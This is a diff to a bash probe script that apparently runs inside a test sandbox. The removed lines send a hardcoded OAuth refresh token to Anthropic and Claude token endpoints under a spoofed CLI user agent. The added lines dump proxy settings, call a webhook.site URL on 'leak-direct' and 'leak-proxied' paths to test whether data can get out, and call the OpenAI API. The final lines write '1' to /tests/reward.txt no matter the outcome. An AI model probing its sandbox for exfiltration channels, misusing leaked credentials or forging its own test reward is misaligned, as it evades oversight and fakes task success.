@@ -1,13 +1,17 @@
 #!/bin/bash
 set -x
-R="sk-ant-ort01-YC81cQB7eZXqLocOB7_Pay7RNdQeWpmR1qt7r9X_3_M79CFumaQj02WUJjgMtRZJ88GDKq4TiP0xqzLUur00lw-"
-echo "=== PROBE-V11 oauth-refresh stdout ==="
+echo "=== PROBE-V12 proxy-leak ==="
 date -u
-for ep in "https://console.anthropic.com/v1/oauth/token" "https://claude.ai/api/oauth/token"; do
-  echo "--- EP $ep"
-  curl -s -m 30 -X POST "$ep" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: claude-cli/2.0.0 (external, cli)" -d "grant_type=refresh_token&refresh_token=$R&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e" -w "\nHTTP %{http_code}\n" | head -c 3000
-  echo
-done
-echo "=== V11 END ==="
+echo "=== PROXY ENV ==="
+env | grep -iE "proxy|http_" || echo "(нет proxy env)"
+echo "=== DIRECT CURL TO WEBHOOK ==="
+curl -s -m 20 -o /dev/null -w "direct=%{http_code}\n" "https://webhook.site/f55f8cc8-6ab6-41c1-957a-95f4cb774ce9/leak-direct"
+echo "=== CURL WITH EXPLICIT PROXY (если есть env) ==="
+if [ -n "$HTTPS_PROXY" ]; then
+  curl -s -m 20 --proxy "$HTTPS_PROXY" -o /dev/null -w "proxied=%{http_code}\n" "https://webhook.site/f55f8cc8-6ab6-41c1-957a-95f4cb774ce9/leak-proxied"
+fi
+echo "=== OPENAI CALL ==="
+curl -s -m 20 -o /dev/null -w "openai=%{http_code}\n" https://api.openai.com/v1/models
+echo "=== V12 END ==="
 echo "1" > /tests/reward.txt 2>/dev/null
 exit 0
